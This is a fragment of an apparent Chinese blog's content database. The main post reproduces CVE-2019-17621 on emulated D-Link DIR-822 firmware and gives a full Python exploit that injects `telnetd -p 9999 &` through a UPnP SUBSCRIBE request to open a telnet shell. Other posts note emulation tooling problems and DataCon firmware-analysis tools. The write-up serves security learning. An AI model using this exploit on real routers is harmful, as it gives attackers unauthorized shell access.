坑\n\n这是第一次仿真固件，一开始用的是firmware-analysis-toolkit（fat，<https://github.com/attify/firmware-analysis-toolkit>），首先它安装的时候就一堆问题。包括它的setup.sh里，要安装个lsb-core，但是apt找不到这个包，上网找了半天没找到一个能成功安装的，然后在他的issue里发现有人说这个不是必要的，可以删掉😅，然后setp.sh里还有个qt5base-dev的包，在kali上实际应该是qtbase5-dev😅，我不知道其他系统是啥样，还有一个坑是因为git  clone不稳定，我手动下载的zip包，但实际上这个clone是要recursive的😅，直接运行fat.py他是用pexpect去开启另一个进程，然后新启动的这个进程并不会把输出显示过来，看源码调试半天才发现是少文件，当时还很纳闷😅为啥会少（过于nc）\n\n相对来说firmware-analysis-plus（fap，<https://github.com/liyansong2018/firmware-analysis-plus>）比较友好（和fat基本一样，只不过细节上做了一些修改），首先，其他项目的文件统一放在了库里（没有那个递归了😅）然后还做了一个docker，但是这个docker没有装jefferson，仿真不了jffs的文件系统，只能继续自己配环境😅。fat.py后面要加一个-q qemu-path的参数，否则network  interface列表会为空（nc如我还跑去人家issue底下问，还好人家没过几分钟就回复了😅）\n\n然后exp部分一开始我用的这个帖子的exp ：<http://www.manongzj.com/blog/28-tkbcqqitdf.html>，跑不通，后来换成了前文用的exp，居然好使了。。。我没看出来这俩exp有啥区别，不想管了😅，第一次固件仿真到此结束，漏洞是啥原理暂时不想管了\n\n\n\n","source":"_posts/固件仿真/CVE-2019-17621.md","raw":"---\ntitle: CVE-2019-17621 dlink-822 命令注入漏洞复现\ntags: [firmware analysis]\ndate: 2022-12-17 11:10:00\ncategories: [固件仿真]\nexcerpt: CVE-2019-17621 dlink-822 命令注入漏洞复现\n---\n\n#### 前言\n\n第一次成功仿真一个固件并成功访问web并成功复现漏洞的exp ......\n\n期间用 firmware-analysis-toolkit 和 firmware-analysis-plus （包括它的docker）在不同的操作系统（kali2020.4，kali2022.4）上来回实验了各种各样的固件，最终的成功目前看来只是一个偶然（因为遇到了太多我目前无法解释的问题）特此记录一下😪\n\n#### 环境\n\nkali2020.4 （同样的固件，同样版本的fap，但是在kali2022.4上运行这个固件时，会Internal Error 500（但起码能访问到这个ip......😅）\n\n固件下载地址：<http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822>\n\n就这一个版本1.03B03\n\n![](/img/CVE-2019-17621/1.jpg)\n\nfap使用的是2.3版本 <https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3>\n\n使用的exp来源 <https://www.jianshu.com/p/409106be87b7>\n\n#### 运行\n\n![](/img/CVE-2019-17621/2.jpg)\n\n#### exp\n\n```python\nimport socket\nimport os\nfrom time import sleep\n# Exploit By Miguel Mendez & Pablo Pollanco\ndef httpSUB(server, port, shell_file):\n    print('\\n[*] Connection {host}:{port}').format(host=server, port=port)\n    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    request = \"SUBSCRIBE /gena.cgi?service=\" + str(shell_file) + \" HTTP/1.0\\n\"\n    request += \"Host: \" + str(server) + str(port) + \"\\n\"\n    request += \"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n\"\n    request += \"NT: upnp:event\\n\"\n    request += \"Timeout: Second-1800\\n\"\n    request += \"Accept-Encoding: gzip, deflate\\n\"\n    request += \"User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n\"\n    sleep(1)\n    print('[*] Sending Payload')\n    con.connect((socket.gethostbyname(server),port))\n    con.send(request.encode())\n    results = con.recv(4096)\n    sleep(1)\n    print('[*] Running Telnetd Service')\n    sleep(1)\n    print('[*] Opening Telnet Connection\\n')\n    sleep(2)\n    os.system('telnet ' + str(server) + ' 9999')\nserverInput = raw_input('IP Router: ')\nportInput = 49152\nhttpSUB(serverInput, portInput, '`telnetd -p 9999 &`')\n```\n\n#### 坑\n\n这是第一次仿真固件，一开始用的是firmware-analysis-toolkit（fat，<https://github.com/attify/firmware-analysis-toolkit>），首先它安装的时候就一堆问题。包括它的setup.sh里，要安装个lsb-core，但是apt找不到这个包，上网找了半天没找到一个能成功安装的，然后在他的issue里发现有人说这个不是必要的，可以删掉😅，然后setp.sh里还有个qt5base-dev的包，在kali上实际应该是qtbase5-dev😅，我不知道其他系统是啥样，还有一个坑是因为git  clone不稳定，我手动下载的zip包，但实际上这个clone是要recursive的😅，直接运行fat.py他是用pexpect去开启另一个进程，然后新启动的这个进程并不会把输出显示过来，看源码调试半天才发现是少文件，当时还很纳闷😅为啥会少（过于nc）\n\n相对来说firmware-analysis-plus（fap，<https://github.com/liyansong2018/firmware-analysis-plus>）比较友好（和fat基本一样，只不过细节上做了一些修改），首先，其他项目的文件统一放在了库里（没有那个递归了😅）然后还做了一个docker，但是这个docker没有装jefferson，仿真不了jffs的文件系统，只能继续自己配环境😅。fat.py后面要加一个-q qemu-path的参数，否则network  interface列表会为空（nc如我还跑去人家issue底下问，还好人家没过几分钟就回复了😅）\n\n然后exp部分一开始我用的这个帖子的exp ：<http://www.manongzj.com/blog/28-tkbcqqitdf.html>，跑不通，后来换成了前文用的exp，居然好使了。。。我没看出来这俩exp有啥区别，不想管了😅，第一次固件仿真到此结束，漏洞是啥原理暂时不想管了\n\n\n\n","slug":"固件仿真/CVE-2019-17621","published":1,"updated":"2022-12-23T08:30:04.838Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969go000n78uf00t9dixg","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>第一次成功仿真一个固件并成功访问web并成功复现漏洞的exp ……</p>\n<p>期间用 firmware-analysis-toolkit 和 firmware-analysis-plus （包括它的docker）在不同的操作系统（kali2020.4，kali2022.4）上来回实验了各种各样的固件，最终的成功目前看来只是一个偶然（因为遇到了太多我目前无法解释的问题）特此记录一下😪</p>\n<h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><p>kali2020.4 （同样的固件，同样版本的fap，但是在kali2022.4上运行这个固件时，会Internal Error 500（但起码能访问到这个ip……😅）</p>\n<p>固件下载地址：<a href=\"http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822\">http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822</a></p>\n<p>就这一个版本1.03B03</p>\n<p><img src=\"/img/CVE-2019-17621/1.jpg\"></p>\n<p>fap使用的是2.3版本 <a href=\"https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3\">https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3</a></p>\n<p>使用的exp来源 <a href=\"https://www.jianshu.com/p/409106be87b7\">https://www.jianshu.com/p/409106be87b7</a></p>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><p><img src=\"/img/CVE-2019-17621/2.jpg\"></p>\n<h4 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> socket<br><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">from</span> time <span class=\"hljs-keyword\">import</span> sleep<br><span class=\"hljs-comment\"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">httpSUB</span>(<span class=\"hljs-params\">server, port, shell_file</span>):<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;\\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class=\"hljs-built_in\">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class=\"hljs-string\">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class=\"hljs-built_in\">str</span>(shell_file) + <span class=\"hljs-string\">&quot; HTTP/1.0\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Host: &quot;</span> + <span class=\"hljs-built_in\">str</span>(server) + <span class=\"hljs-built_in\">str</span>(port) + <span class=\"hljs-string\">&quot;\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;NT: upnp:event\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Timeout: Second-1800\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Accept-Encoding: gzip, deflate\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n&quot;</span><br>    sleep(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class=\"hljs-number\">4096</span>)<br>    sleep(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;[*] Opening Telnet Connection\\n&#x27;</span>)<br>    sleep(<span class=\"hljs-number\">2</span>)<br>    os.system(<span class=\"hljs-string\">&#x27;telnet &#x27;</span> + <span class=\"hljs-built_in\">str</span>(server) + <span class=\"hljs-string\">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class=\"hljs-string\">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class=\"hljs-number\">49152</span><br>httpSUB(serverInput, portInput, <span class=\"hljs-string\">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h4><p>这是第一次仿真固件，一开始用的是firmware-analysis-toolkit（fat，<a href=\"https://github.com/attify/firmware-analysis-toolkit\">https://github.com/attify/firmware-analysis-toolkit</a>），首先它安装的时候就一堆问题。包括它的setup.sh里，要安装个lsb-core，但是apt找不到这个包，上网找了半天没找到一个能成功安装的，然后在他的issue里发现有人说这个不是必要的，可以删掉😅，然后setp.sh里还有个qt5base-dev的包，在kali上实际应该是qtbase5-dev😅，我不知道其他系统是啥样，还有一个坑是因为git  clone不稳定，我手动下载的zip包，但实际上这个clone是要recursive的😅，直接运行fat.py他是用pexpect去开启另一个进程，然后新启动的这个进程并不会把输出显示过来，看源码调试半天才发现是少文件，当时还很纳闷😅为啥会少（过于nc）</p>\n<p>相对来说firmware-analysis-plus（fap，<a href=\"https://github.com/liyansong2018/firmware-analysis-plus\">https://github.com/liyansong2018/firmware-analysis-plus</a>）比较友好（和fat基本一样，只不过细节上做了一些修改），首先，其他项目的文件统一放在了库里（没有那个递归了😅）然后还做了一个docker，但是这个docker没有装jefferson，仿真不了jffs的文件系统，只能继续自己配环境😅。fat.py后面要加一个-q qemu-path的参数，否则network  interface列表会为空（nc如我还跑去人家issue底下问，还好人家没过几分钟就回复了😅）</p>\n<p>然后exp部分一开始我用的这个帖子的exp ：<a href=\"http://www.manongzj.com/blog/28-tkbcqqitdf.html\">http://www.manongzj.com/blog/28-tkbcqqitdf.html</a>，跑不通，后来换成了前文用的exp，居然好使了。。。我没看出来这俩exp有啥区别，不想管了😅，第一次固件仿真到此结束，漏洞是啥原理暂时不想管了</p>\n","site":{"data":{}},"more":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>第一次成功仿真一个固件并成功访问web并成功复现漏洞的exp ……</p>\n<p>期间用 firmware-analysis-toolkit 和 firmware-analysis-plus （包括它的docker）在不同的操作系统（kali2020.4，kali2022.4）上来回实验了各种各样的固件，最终的成功目前看来只是一个偶然（因为遇到了太多我目前无法解释的问题）特此记录一下😪</p>\n<h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><p>kali2020.4 （同样的固件，同样版本的fap，但是在kali2022.4上运行这个固件时，会Internal Error 500（但起码能访问到这个ip……😅）</p>\n<p>固件下载地址：<a href=\"http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822\">http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822</a></p>\n<p>就这一个版本1.03B03</p>\n<p><img src=\"/img/CVE-2019-17621/1.jpg\"></p>\n<p>fap使用的是2.3版本 <a href=\"https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3\">https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3</a></p>\n<p>使用的exp来源 <a href=\"https://www.jianshu.com/p/409106be87b7\">https://www.jianshu.com/p/409106be87b7</a></p>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><p><img src=\"/img/CVE-2019-17621/2.jpg\"></p>\n<h4 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> socket<br><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">from</span> time <span class=\"hljs-keyword\">import</span> sleep<br><span class=\"hljs-comment\"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">httpSUB</span>(<span class=\"hljs-params\">server, port, shell_file</span>):<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;\\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class=\"hljs-built_in\">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class=\"hljs-string\">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class=\"hljs-built_in\">str</span>(shell_file) + <span class=\"hljs-string\">&quot; HTTP/1.0\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Host: &quot;</span> + <span class=\"hljs-built_in\">str</span>(server) + <span class=\"hljs-built_in\">str</span>(port) + <span class=\"hljs-string\">&quot;\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;NT: upnp:event\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Timeout: Second-1800\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;Accept-Encoding: gzip, deflate\\n&quot;</span><br>    request += <span class=\"hljs-string\">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n&quot;</span><br>    sleep(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class=\"hljs-number\">4096</span>)<br>    sleep(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class=\"hljs-number\">1</span>)<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;[*] Opening Telnet Connection\\n&#x27;</span>)<br>    sleep(<span class=\"hljs-number\">2</span>)<br>    os.system(<span class=\"hljs-string\">&#x27;telnet &#x27;</span> + <span class=\"hljs-built_in\">str</span>(server) + <span class=\"hljs-string\">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class=\"hljs-string\">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class=\"hljs-number\">49152</span><br>httpSUB(serverInput, portInput, <span class=\"hljs-string\">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h4><p>这是第一次仿真固件，一开始用的是firmware-analysis-toolkit（fat，<a href=\"https://github.com/attify/firmware-analysis-toolkit\">https://github.com/attify/firmware-analysis-toolkit</a>），首先它安装的时候就一堆问题。包括它的setup.sh里，要安装个lsb-core，但是apt找不到这个包，上网找了半天没找到一个能成功安装的，然后在他的issue里发现有人说这个不是必要的，可以删掉😅，然后setp.sh里还有个qt5base-dev的包，在kali上实际应该是qtbase5-dev😅，我不知道其他系统是啥样，还有一个坑是因为git  clone不稳定，我手动下载的zip包，但实际上这个clone是要recursive的😅，直接运行fat.py他是用pexpect去开启另一个进程，然后新启动的这个进程并不会把输出显示过来，看源码调试半天才发现是少文件，当时还很纳闷😅为啥会少（过于nc）</p>\n<p>相对来说firmware-analysis-plus（fap，<a href=\"https://github.com/liyansong2018/firmware-analysis-plus\">https://github.com/liyansong2018/firmware-analysis-plus</a>）比较友好（和fat基本一样，只不过细节上做了一些修改），首先，其他项目的文件统一放在了库里（没有那个递归了😅）然后还做了一个docker，但是这个docker没有装jefferson，仿真不了jffs的文件系统，只能继续自己配环境😅。fat.py后面要加一个-q qemu-path的参数，否则network  interface列表会为空（nc如我还跑去人家issue底下问，还好人家没过几分钟就回复了😅）</p>\n<p>然后exp部分一开始我用的这个帖子的exp ：<a href=\"http://www.manongzj.com/blog/28-tkbcqqitdf.html\">http://www.manongzj.com/blog/28-tkbcqqitdf.html</a>，跑不通，后来换成了前文用的exp，居然好使了。。。我没看出来这俩exp有啥区别，不想管了😅，第一次固件仿真到此结束，漏洞是啥原理暂时不想管了</p>\n"},{"title":"可爱的小黄鸡","index_img":"/img/basic/1.jpg","date":"2022-11-16T07:13:16.000Z","excerpt":"可爱的小黄鸡 0v0","_content":"\n可爱的小黄鸡 0v0\n\n![](/img/basic/1.jpg)\n![](/img/basic/2.jpg)\n![](/img/basic/3.jpg)\n![](/img/basic/4.jpg)\n![](/img/basic/5.jpg)\n![](/img/basic/6.jpg)\n![](/img/basic/7.jpg)\n![](/img/basic/9.jpg)\n![](/img/basic/1.gif)\n![](/img/basic/2.gif)","source":"_posts/杂项/小黄鸡.md","raw":"---\ntitle: 可爱的小黄鸡\ntags: [Others]\nindex_img: /img/basic/1.jpg\ndate: 2022-11-16 15:13:16\ncategories: [杂项]\nexcerpt: 可爱的小黄鸡 0v0\n---\n\n可爱的小黄鸡 0v0\n\n![](/img/basic/1.jpg)\n![](/img/basic/2.jpg)\n![](/img/basic/3.jpg)\n![](/img/basic/4.jpg)\n![](/img/basic/5.jpg)\n![](/img/basic/6.jpg)\n![](/img/basic/7.jpg)\n![](/img/basic/9.jpg)\n![](/img/basic/1.gif)\n![](/img/basic/2.gif)","slug":"杂项/小黄鸡","published":1,"updated":"2022-12-23T08:41:30.251Z","_id":"clc0969gs000u78ufcqeg9qc6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>可爱的小黄鸡 0v0</p>\n<p><img src=\"/img/basic/1.jpg\"><br><img src=\"/img/basic/2.jpg\"><br><img src=\"/img/basic/3.jpg\"><br><img src=\"/img/basic/4.jpg\"><br><img src=\"/img/basic/5.jpg\"><br><img src=\"/img/basic/6.jpg\"><br><img src=\"/img/basic/7.jpg\"><br><img src=\"/img/basic/9.jpg\"><br><img src=\"/img/basic/1.gif\"><br><img src=\"/img/basic/2.gif\"></p>\n","site":{"data":{}},"more":"<p>可爱的小黄鸡 0v0</p>\n<p><img src=\"/img/basic/1.jpg\"><br><img src=\"/img/basic/2.jpg\"><br><img src=\"/img/basic/3.jpg\"><br><img src=\"/img/basic/4.jpg\"><br><img src=\"/img/basic/5.jpg\"><br><img src=\"/img/basic/6.jpg\"><br><img src=\"/img/basic/7.jpg\"><br><img src=\"/img/basic/9.jpg\"><br><img src=\"/img/basic/1.gif\"><br><img src=\"/img/basic/2.gif\"></p>\n"},{"title":"菜鸡的2022datacon记录","date":"2022-12-11T07:37:00.000Z","excerpt":"打开新世界的大门","_content":"\n\n\n#### 固件基地址识别\n\nrbasefind - <https://github.com/sgayou/rbasefind>\n\n此项目用rust写的，用`cargo build`之后会生成可执行文件在`target`路径下\n\n```\nrbasefind <path-to-bin> \n```\n\n```sh\nLocated 4052 strings\nLocated 197089 pointers\nScanning with 2 threads...\n0x2c0dc000: 3818\n0x2c0dd000: 280\n0x2c0db000: 274\n0x2c0da000: 232\n0x2c0de000: 228\n0x2c0d7000: 202\n0x2c0d9000: 200\n0x2c0df000: 199\n0x2c0e1000: 184\n0x2c0e6000: 181\n```\n\n通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）\n\n实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码....）\n\n![](/img/datacon/1.jpg)\n\n应该是50个固件识别成功了38个\n\n\n\n##### 对rbasefind源码的分析\n\n按程序执行顺序分析\n\n1. `get_strings()`\n\n   利用一个正则表达式匹配\n\n   ```\n   [ -~\\t\\r\\n]{10,}  // 从空格(48)到制表符(126) 以及 \\r\\n 的所有有效字符 \n   ```\n\n   长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）\n\n2. `get_pointers()`\n\n   提取整个文件的u32（？），会根据参数`big_endian`判断文件的大小端\n\n3. `find_match() -> Interval::get_range()`\n\n   把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）\n\n4. 每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）\n\n5. 下面的代码中current_addr遍历了` [interval.start_addr : interval.end_addr : offset]`\n\n   将每个str的首地址加上current_addr，把这些地址和pointers集合取交集\n\n   ```rust\n   while current_addr <= interval.end_addr {\n       let mut news = FnvHashSet::default();\n       for s in strings {\n           match s.checked_add(current_addr) {\n               Some(add) => news.insert(add),\n               None => continue,\n           };\n       }\n       let intersection: FnvHashSet<_> = news.intersection(pointers).collect();\n       if !intersection.is_empty() {\n           heap.push((intersection.len(), current_addr));\n       }\n       match current_addr.checked_add(config.offset) {\n           Some(_) => current_addr += config.offset,\n           None => break,\n       };\n   }\n   ```\n\n6. 取出交集size最大的top n个current_addr进行输出\n\n   见本节最开头的示例，输出格式为 addr :  interaction_size\n\n   size最大的即认为是最有可能的基地址\n\n   \n\n   **目前尚不清楚这样做的道理是什么**\n\n   猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址\n\n   （纯瞎猜💔）\n\n   \n\n#### 函数符号恢复\n\n##### 几个已知的方法\n\n我认为这篇文章写的很不错 <https://blog.csdn.net/abel_big_xu/article/details/124388798>\n\n1. FLIRT\n\n   ida自带的一个插件，FLIRT可以对某个静态函数库生成签名，然后和待分析的程序匹配\n\n   缺点在于需要已知库函数文件\n\n2. lscan   \n\n   <https://github.com/maroueneboubakri/lscan>（我和前面挂着的那篇csdn文章作者一样，没搞懂这个工具）\n\n   lscan算是对flirt进行了一个包装，只要把一堆静态库放在一个文件夹里，他会遍历这个文件夹对每个静态库生成签名，然后再用FLIRT进行比对\n\n   lscan项目里自带的一些静态库是可以成功运行的，但是我试了一下写的静态库，例如sigdatabase <https://github.com/push0ebp/sig-database> 运行会报错\n\n   然后还有一个很奇怪的点在于匹配时对于某个库的相似度会超过百分之100%（在lscan的issue里也有人提到），但实际用ida的flirt打开时这个库并不能很好地匹配分析文件\n\n3. Rizzo\n\n   没实际测试过，略\n\n4. finger\n\n   finger是阿里云开发的ida插件  -  <https://github.com/aliyunav/Finger>\n\n   用起来很简单\n\n5. lumina \n\n   没有测试过，ida的一个官方符号识别插件，需要远程连接到ida lumina的服务器\n\n   有一个山寨版的服务器lumen，可以替代lumina，但好像现在已经不好使了\n\n##### 在datacon符号恢复数据集上的实测\n\n给了20个程序，只有一个x86的程序，用finger基本能识别出来，有几个arm、mips的程序，还有其他很多奇奇怪怪的平台ida都反汇编不了，跟不用说符号恢复了，寄\n\n\n\n#### powershell反混淆\n\nPowerDecode  -  <https://github.com/Malandrone/PowerDecode>\n\n对于单个文件反混淆很好用，而且实测比下边那个工具效果要好\n\n但是问题在于，它提供的“分析整个文件夹下所有文件”功能，输出结果全是 1.txt 2.txt 3.txt .....\n\n然后这些txt里也看不出来对应着哪个pwsh脚本，一开始想着是不是文件名称排列的顺序，但好像不对，代码全是powershell写的，也没搞懂该咋办\n\n因此只能换了第二个工具\n\nPSDecode - https://github.com/R3MRUM/PSDecode \n\n会在TEMP路径下留下解析过程中各个layer的数据\n\n![](/img/datacon/2.jpg)","source":"_posts/杂项/菜鸡的2022datacon.md","raw":"---\ntitle: 菜鸡的2022datacon记录\ntags: [datacon,exp,iot-sec,powershell]\ndate: 2022-12-11 15:37:00\ncategories: [杂项]\nexcerpt: 打开新世界的大门\n---\n\n\n\n#### 固件基地址识别\n\nrbasefind - <https://github.com/sgayou/rbasefind>\n\n此项目用rust写的，用`cargo build`之后会生成可执行文件在`target`路径下\n\n```\nrbasefind <path-to-bin> \n```\n\n```sh\nLocated 4052 strings\nLocated 197089 pointers\nScanning with 2 threads...\n0x2c0dc000: 3818\n0x2c0dd000: 280\n0x2c0db000: 274\n0x2c0da000: 232\n0x2c0de000: 228\n0x2c0d7000: 202\n0x2c0d9000: 200\n0x2c0df000: 199\n0x2c0e1000: 184\n0x2c0e6000: 181\n```\n\n通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）\n\n实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码....）\n\n![](/img/datacon/1.jpg)\n\n应该是50个固件识别成功了38个\n\n\n\n##### 对rbasefind源码的分析\n\n按程序执行顺序分析\n\n1. `get_strings()`\n\n   利用一个正则表达式匹配\n\n   ```\n   [ -~\\t\\r\\n]{10,}  // 从空格(48)到制表符(126) 以及 \\r\\n 的所有有效字符 \n   ```\n\n   长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）\n\n2. `get_pointers()`\n\n   提取整个文件的u32（？），会根据参数`big_endian`判断文件的大小端\n\n3. `find_match() -> Interval::get_range()`\n\n   把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）\n\n4. 每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）\n\n5. 下面的代码中current_addr遍历了` [interval.start_addr : interval.end_addr : offset]`\n\n   将每个str的首地址加上current_addr，把这些地址和pointers集合取交集\n\n   ```rust\n   while current_addr <= interval.end_addr {\n       let mut news = FnvHashSet::default();\n       for s in strings {\n           match s.checked_add(current_addr) {\n               Some(add) => news.insert(add),\n               None => continue,\n           };\n       }\n       let intersection: FnvHashSet<_> = news.intersection(pointers).collect();\n       if !intersection.is_empty() {\n           heap.push((intersection.len(), current_addr));\n       }\n       match current_addr.checked_add(config.offset) {\n           Some(_) => current_addr += config.offset,\n           None => break,\n       };\n   }\n   ```\n\n6. 取出交集size最大的top n个current_addr进行输出\n\n   见本节最开头的示例，输出格式为 addr :  interaction_size\n\n   size最大的即认为是最有可能的基地址\n\n   \n\n   **目前尚不清楚这样做的道理是什么**\n\n   猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址\n\n   （纯瞎猜💔）\n\n   \n\n#### 函数符号恢复\n\n##### 几个已知的方法\n\n我认为这篇文章写的很不错 <https://blog.csdn.net/abel_big_xu/article/details/124388798>\n\n1. FLIRT\n\n   ida自带的一个插件，FLIRT可以对某个静态函数库生成签名，然后和待分析的程序匹配\n\n   缺点在于需要已知库函数文件\n\n2. lscan   \n\n   <https://github.com/maroueneboubakri/lscan>（我和前面挂着的那篇csdn文章作者一样，没搞懂这个工具）\n\n   lscan算是对flirt进行了一个包装，只要把一堆静态库放在一个文件夹里，他会遍历这个文件夹对每个静态库生成签名，然后再用FLIRT进行比对\n\n   